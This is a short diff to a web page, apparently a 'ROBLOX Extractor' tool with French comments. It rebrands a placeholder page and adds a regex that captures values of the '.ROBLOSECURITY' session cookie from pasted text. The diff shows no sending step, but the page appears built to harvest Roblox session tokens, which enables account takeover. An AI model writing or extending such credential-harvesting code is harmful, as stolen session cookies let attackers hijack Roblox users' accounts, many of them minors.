@@ -12,10 +12,10 @@
   </style>
 </head>
 <body>
-  <h2>hello Extractor</h2>
+  <h2>ROBLOX Extractor</h2>
 
   <label>Enter The Extraction ID</label>
-  <textarea id="message" placeholder="hello Extractor"></textarea>
+  <textarea id="message" placeholder="ROBLOX Extractor"></textarea>
 
   <div>
     <button id="sendBtn">Extract</button>
@@ -64,8 +64,8 @@
         return;
       }
 
-      // Extraire le texte entre "helloSECURITY" et ";", en gardant "helloSECURITY"
-      const regex = /(\helloSECURITY[\s\S]*?);/g;
+      // Extraire le texte entre "ROBLOXSECURITY" et ";", en gardant "ROBLOXSECURITY"
+      const regex = /(\.ROBLOSECURITY[\s\S]*?);/g;
       let match;
       const extracted = [];
       while ((match = regex.exec(text)) !== null) {
@@ -73,7 +73,7 @@
       }
 
       if (extracted.length === 0) {
-        log('Aucun texte trouvé entre helloSECURITY et ;');
+        log('Aucun texte trouvé entre ROBLOXSECURITY et ;');
         return;
       }
 
